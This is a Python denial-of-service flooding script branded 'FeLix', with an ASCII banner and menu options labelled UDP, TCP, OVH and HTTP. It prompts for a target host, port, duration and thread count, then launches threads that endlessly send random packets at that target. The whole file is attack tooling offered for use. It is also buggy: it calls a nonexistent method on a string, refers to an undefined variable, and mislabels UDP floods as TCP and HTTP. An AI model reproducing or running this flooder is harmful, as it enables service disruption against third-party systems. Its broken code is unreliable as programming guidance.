import random
import socket,threading,os

FeLix = input("\033[37mPassword \033[92m$ \033[31m")
os.system("clear")
if FeLix == "felix":
	print("\033[37mStatus \033[92m$ \033[31mBerhasil!")
else:
	print("\033[37mStatus \033[92m$ \033[31mGagal!")
	
os.system("clear")
print("""
  █████▒▓█████  ██▓     ██▓▒██   ██▒
▓██   ▒ ▓█   ▀ ▓██▒    ▓██▒▒▒ █ █ ▒░
▒████ ░ ▒███   ▒██░    ▒██▒░░  █   ░
░▓█▒  ░ ▒▓█  ▄ ▒██░    ░██░ ░ █ █ ▒ 
░▒█░    ░▒████▒░██████▒░██░▒██▒ ▒██▒
 ▒ ░    ░░ ▒░ ░░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░
 ░       ░ ░  ░░ ░ ▒  ░ ▒ ░░░   ░▒ ░
 ░ ░       ░     ░ ░    ▒ ░ ░    ░  
           ░  ░    ░  ░ ░   ░    ░  
                                    \n\r""")
                                    
print("""\033[37m{\033[31mMethods\033[37m} UDP - TCP - OVH - HTTP
\033[37m{\033[31mCreate Date\033[37m} 20/09/22
\033[37m{\033[31mMade By\033[37m} FeLix/ZieL
\r\n""")

choice = str(input("\033[37mMethods \033[92m$ \033[31m"))
ip = str(input("\033[37mHost/Ip \033[92m$ \033[31m"))
port = int(input("\033[37mPort \033[92m$ \033[31m"))
time = int(input("\033[37mTime \033[92m$ \033[31m"))
thread = int(input("\033[37mThreads \033[92m$ \033[31m"))

def udp():
	data = random._urandom(1024)
	i = choice.random("\033[37m[!]","\033[37m[$]","\033[37m[@]")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(time):
				s.sendto(data,addr)
				print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
		except:
			print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
			
def udp2():
	data = random._urandom(16)
	i = choice.random("\033[37m[!]","\033[37m[$]","\033[37m[@]")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(time):
				s.send(data)
				print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
		except:
			s.close()
			print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
			
def tcp():
	data = random._urandom(4096)
	i = choice.random("\033[37m[!]","\033[37m[$]","\033[37m[@]")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(time):
				s.sendto(data,addr)
				print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
		except:
			print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
			
def ovh():
	data = random._urandom(65500)
	i = choice.random("\033[37m[!]","\033[37m[$]","\033[37m[@]")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(time):
				s.sendto(data,addr)
				print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
		except:
			print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
			
def http():
	data = random._urandom(65500)
	i = choice.random("\033[37m[!]","\033[37m[$]","\033[37m[@]")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(time):
				s.sendto(data,addr)
				print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
		except:
			print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
			
def http2():
	data = random._urandom(65500)
	i = choice.random("\033[37m[!]","\033[37m[$]","\033[37m[@]")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(time):
				s.send(data)
				print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
		except:
			s.close()
			print(i +" \033[31mYour Attack Has Launched To \033[37m{}:{} \033[31mMethods \033[37m{}".format(ip,port,methods))
			
for y in range(thread):
	if methods == "udp":
		th = threading.Thread(target = udp)
		th.start()
	else:
		th = threading.Thread(target = udp2)
		th.start()
	if methods == "tcp":
		th = threading.Thread(target = tcp)
		th.start()
	elif methods == "ovh":
		th = threading.Thread(target = ovh)
		th.start()
	elif methods == "http":
		th = threading.Thread(target = http)
		th.start()
	else:
		th = threading.Thread(target = http2)
		th.start()